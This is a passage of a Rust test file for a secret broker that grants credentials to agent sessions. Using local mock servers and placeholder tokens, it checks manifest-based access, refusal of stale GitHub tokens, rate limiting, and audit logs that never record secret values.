        .canonicalize()
        .unwrap();
    let tmp = tempfile::tempdir().unwrap();
    let bin = tmp.path().join("bin");
    std::fs::create_dir_all(&bin).unwrap();
    let write_exec = |name: &str, body: &str| {
        use std::os::unix::fs::PermissionsExt;
        let path = bin.join(name);
        std::fs::write(&path, body).unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
    };
    write_exec("vogt-mcp-bootstrap", "#!/bin/sh\nexit 0\n");
    write_exec("infisical", "#!/bin/sh\nprintf tok-123\n");
    let api = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let api_url = format!("http://{}", api.local_addr().unwrap());
    tokio::spawn(async move {
        let app = axum::Router::new()
            .route(
                "/api/v4/secrets",
                axum::routing::get(|| async {
                    axum::Json(json!({ "secrets": [
                        { "secretKey": "ALPHA", "secretValue": "alpha-value" },
                        { "secretKey": "PROVIDER_KEY", "secretValue": "provider-value" }
                    ]}))
                }),
            )
            // Universal-auth is an API request in the helper (WI-3885).
            .route(
                "/api/v1/auth/universal-auth/login",
                axum::routing::post(|| async { axum::Json(json!({ "accessToken": "tok-123" })) }),
            );
        axum::serve(api, app).await.unwrap()
    });

    let manifest_file = tmp.path().join("agent-auth-secrets");
    let mut cfg = broker_config(&tmp, "ALPHA proj-a ALPHA\n");
    // The real helper, so the launch is the one a deployment runs and the
    // engine re-grants it the live manifest.
    cfg.agent_auth_helper = script.clone();
    cfg.agent_auth_secrets_file = Some(manifest_file.clone());
    let (base, state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let path = format!("{}:/usr/bin:/bin", bin.display());
    let start = |name: &'static str| {
        let client = client.clone();
        let base = base.clone();
        let script = script.display().to_string();
        let (path, api_url, bin) = (path.clone(), api_url.clone(), bin.clone());
        async move {
            client
                .post(format!("{base}/api/sessions"))
                .json(&json!({
                    "name": name,
                    "command": [script, "run", "--", "/bin/bash", "-c",
                        "echo \"granted=[$AGENT_AUTH_GRANTED] provider=[${PROVIDER_KEY:-}] file=[${ENGINE_AGENT_AUTH_SECRETS_FILE:-}]\"; sleep 30"],
                    // No manifest here: it is the engine's to hand over.
                    "env": [
                        ["PATH", path],
                        ["VOGT_MCP_BOOTSTRAP", bin.join("vogt-mcp-bootstrap").display().to_string()],
                        ["ENGINE_AGENT_AUTH_TIMEOUT", "5"],
                        ["INFISICAL_API_URL", format!("{api_url}/api")],
                        ["INFISICAL_CLIENT_ID", "id"],
                        ["INFISICAL_CLIENT_SECRET", "secret"],
                    ],
                }))
                .send()
                .await
                .unwrap()
                .json::<Value>()
                .await
                .unwrap()["id"]
                .as_str()
                .unwrap()
                .to_string()
        }
    };

    // Before the line: the stack's manifest only.
    let before = start("before-the-line").await;
    live_output_containing(
        &client,
        &base,
        &before,
        &["granted=[ALPHA] provider=[] file=[]"],
    )
    .await;
    let session: uuid::Uuid = before.parse().unwrap();
    let token = state.sessions.secret_broker().issue(session);
    let plain = reqwest::Client::new();
    let fetch = |var: &str| format!("{base}/api/agent-auth/fetch/{var}");
    let r = plain
        .post(fetch("PROVIDER_KEY"))
        .bearer_auth(&token)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 403, "an unlisted name is refused");

    // The operator adds a line; the same engine, no restart.
    std::fs::write(&manifest_file, "PROVIDER_KEY proj-a PROVIDER_KEY\n").unwrap();
    let after = start("after-the-line").await;
    live_output_containing(
        &client,
        &base,
        &after,
        &["granted=[ALPHA PROVIDER_KEY] provider=[provider-value] file=[]"],
    )
    .await;
    // And the broker's policy follows the file too.
    let r = plain
        .post(fetch("PROVIDER_KEY"))
        .bearer_auth(&token)
        .send()
        .await
        .unwrap();
    assert_ne!(r.status(), 403, "a listed name passes the manifest check");
    let r = plain
        .post(fetch("NEVER_LISTED"))
        .bearer_auth(&token)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 403);
}

#[tokio::test]
async fn the_fetch_endpoint_refuses_a_stale_github_token_naming_its_source_and_raises_one_item() {
    let (api, _) = fake_github_api(401).await;
    let (base, token, state, _tmp) = github_broker_session(&api).await;
    let raised = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let sink = std::sync::Arc::clone(&raised);
    state
        .sessions
        .secret_broker()
        .github_check()
        .set_sink(std::sync::Arc::new(move |s| sink.lock().unwrap().push(s)));
    let plain = reqwest::Client::new();
    for _ in 0..2 {
        let r = plain
            .post(format!("{base}/api/agent-auth/fetch/GH_TOKEN"))
            .bearer_auth(&token)
            .send()
            .await
            .unwrap();
        assert_eq!(r.status(), 424);
        let text = r.text().await.unwrap();
        let body: Value = serde_json::from_str(&text).unwrap();
        assert_eq!(body["code"], "credential_stale");
        assert_eq!(body["source"], "vogt-dev-llm/GH_TOKEN_SRC");
        assert!(
            body["error"].as_str().unwrap().contains("needs a person"),
            "{text}"
        );
        assert!(
            !text.contains("value-of-GH_TOKEN"),
            "the value never leaks: {text}"
        );
    }
    assert_eq!(raised.lock().unwrap().len(), 1, "one item per stale token");
}

#[tokio::test]
async fn the_fetch_endpoint_hands_the_token_out_when_github_is_down_but_the_check_ran() {
    let (base, token, state, _tmp) = github_broker_session("http://127.0.0.1:1").await;
    let check = state.sessions.secret_broker().github_check();
    assert!(check.enabled(), "the check is on");
    let r = reqwest::Client::new()
        .post(format!("{base}/api/agent-auth/fetch/GH_TOKEN"))
        .bearer_auth(&token)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    assert_eq!(r.text().await.unwrap(), "value-of-GH_TOKEN");
    assert!(
        check.probe_count() >= 1,
        "GitHub was probed, then failed open"
    );
}

#[tokio::test]
async fn a_launch_exports_nothing_for_a_stale_github_token_and_says_why() {
    let (api, _) = fake_github_api(401).await;
    let out = launch_with_github_token(&api).await;
    assert!(out.contains("launch gh=[] "), "{out}");
    assert!(
        out.contains("credential stale: GH_TOKEN_SRC, needs a person"),
        "{out}"
    );
    assert!(!out.contains("ghp_launchvalue"), "{out}");
}

#[tokio::test]
async fn a_launch_exports_a_github_token_github_accepts() {
    let (api, _) = fake_github_api(200).await;
    let out = launch_with_github_token(&api).await;
    assert!(out.contains("launch gh=[ghp_launchvalue] why=[]"), "{out}");
}

#[tokio::test]
async fn the_check_route_judges_the_engines_own_copy_never_a_value_the_caller_sends() {
    // The engine's copy of GH_TOKEN ("value-of-GH_TOKEN") is the stale one.
    let api = fake_github_rejecting("value-of-GH_TOKEN").await;
    let (base, token, state, _keep) = github_broker_session(&api).await;
    let raised = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let sink = std::sync::Arc::clone(&raised);
    state
        .sessions
        .secret_broker()
        .github_check()
        .set_sink(std::sync::Arc::new(move |s| sink.lock().unwrap().push(s)));
    // A caller-supplied "good" value cannot clear a stale token or hide it.
    let answer = ask_check(&base, &token, "ghp_callers_good_value").await;
    assert_eq!(answer["status"], "stale", "{answer}");
    assert_eq!(raised.lock().unwrap().len(), 1);
    assert!(!answer.to_string().contains("ghp_callers_good_value"));
}

#[tokio::test]
async fn a_junk_value_from_the_caller_cannot_raise_an_inbox_item_for_a_good_token() {
    // The engine's copy is fine; only the caller's junk would be rejected.
    let api = fake_github_rejecting("ghp_callers_junk_value").await;
    let (base, token, state, _keep) = github_broker_session(&api).await;
    let raised = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let sink = std::sync::Arc::clone(&raised);
    state
        .sessions
        .secret_broker()
        .github_check()
        .set_sink(std::sync::Arc::new(move |s| sink.lock().unwrap().push(s)));
    let answer = ask_check(&base, &token, "ghp_callers_junk_value").await;
    assert_eq!(answer["status"], "ok", "{answer}");
    assert!(raised.lock().unwrap().is_empty(), "no item for junk");
}

#[tokio::test]
async fn the_check_route_is_rate_limited_with_the_fetch_budget_and_audited_without_the_value() {
    let logs = std::sync::Arc::new(std::sync::Mutex::new(Vec::<u8>::new()));
    #[derive(Clone)]
    struct Cap(std::sync::Arc<std::sync::Mutex<Vec<u8>>>);
    impl std::io::Write for Cap {
        fn write(&mut self, b: &[u8]) -> std::io::Result<usize> {
            self.0.lock().unwrap().extend_from_slice(b);
            Ok(b.len())
        }
        fn flush(&mut self) -> std::io::Result<()> {
            Ok(())
        }
    }
    impl<'a> tracing_subscriber::fmt::MakeWriter<'a> for Cap {
        type Writer = Cap;
        fn make_writer(&'a self) -> Self::Writer {
            self.clone()
        }
    }
    let _guard = tracing::subscriber::set_default(
        tracing_subscriber::fmt()
            .with_writer(Cap(logs.clone()))
            .with_ansi(false)
            .finish(),
    );
    let api = fake_github_rejecting("value-of-GH_TOKEN").await;
    let (base, token, _state, _keep) = github_broker_session(&api).await;
    let mut limited = false;
    for _ in 0..70 {
        let r = reqwest::Client::new()
            .post(format!("{base}/api/agent-auth/github-check/GH_TOKEN"))
            .bearer_auth(&token)
            .send()
            .await
            .unwrap();
        if r.status() == 429 {
            assert!(r.headers().contains_key("retry-after"));
            limited = true;
            break;
        }
    }
    assert!(limited, "the check shares the fetch route's rate limit");
    let text = String::from_utf8(logs.lock().unwrap().clone()).unwrap();
    assert!(
        text.contains("secret broker GitHub check") && text.contains("result=stale"),
        "audited by session, name and result: {text}"
    );
    assert!(text.contains("var=GH_TOKEN") && text.contains("session_id="));
    assert!(!text.contains("value-of-GH_TOKEN"), "never the value");
}
